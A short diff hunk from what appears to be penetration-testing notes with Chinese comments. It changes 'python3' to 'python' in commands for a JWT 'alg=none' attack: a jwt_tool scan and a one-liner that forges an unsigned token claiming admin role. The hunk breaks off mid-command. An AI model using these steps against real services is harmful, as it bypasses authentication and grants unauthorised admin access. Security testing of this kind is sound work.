@@ -261,10 +261,10 @@ def test_all_variants(target_url, payload):
 
 ```bash
 # jwt_tool alg=none 扫描
-python3 jwt_tool.py <token> -X n
+python jwt_tool.py <token> -X n
 
 # 手动构造
-python3 -c "
+python -c "
 import base64,json
 h=base64.urlsafe_b64encode(json.dumps({'alg':'none'}).encode()).rstrip(b'=').decode()
 p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
